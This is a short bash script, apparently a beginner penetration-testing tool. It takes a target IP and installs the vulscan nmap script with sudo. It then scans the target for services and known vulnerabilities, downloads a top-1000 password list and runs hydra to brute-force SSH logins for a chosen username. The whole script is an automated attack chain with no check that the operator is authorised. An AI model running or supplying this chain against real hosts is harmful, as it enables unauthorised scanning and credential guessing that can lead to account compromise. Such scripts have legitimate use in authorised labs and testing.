#!/bin/bash

#Greatings UserName by time
function GR()
{
    clear
	currenttime=$(date +%H:%M)
   	if [[ "$currenttime" > "04:59" ]] && [[ "$currenttime" < "12:00" ]]; then
     	echo "//Good morning $USER\\\\"
    elif [[ "$currenttime" > "11:59" ]] && [[ "$currenttime" < "18:00" ]]; then
     	echo "//Good afternoon $USER\\\\"
    else
     	echo "//Good evening $USER\\\\"
   	fi
	echo ___________________________________
	echo
	sleep 0.5
}


#Getting the user input and make a directory
function IN()
	{
		echo "Type IP to scan"
		read IP
		mkdir $HOME/Desktop/$IP
	}

#Run ports and voulnerabilitys scan
function SCAN()
	{
		cd /usr/share/nmap/scripts
		sudo git clone https://github.com/scipag/vulscan scipag_vulscan
		sudo ln -s `pwd`/scipag_vulscan /usr/share/nmap/scripts/vulscan
		nmap -sV --script=vulscan/vulscan.nse $IP -oN $HOME/Desktop/$IP/nmap.txt
	}

#Brute force Weak passwords with ssh
function HYDRA()
	{
		echo "Does the ssh service seems up?"
		echo "1/0"
		read SSH
		if (($SSH==1))
			then
			echo "Enter a User name"
			read USER
			cd $HOME/Desktop/$IP
			wget https://raw.githubusercontent.com/yuval328/WEAK/main/password-list-top-1000.txt
			hydra -l $USER -P $HOME/Desktop/$IP/password-list-top-1000.txt $IP -t 4 ssh -o $HOME/Desktop/$IP/hydra.txt
		fi
	}

GR
IN
SCAN
HYDRA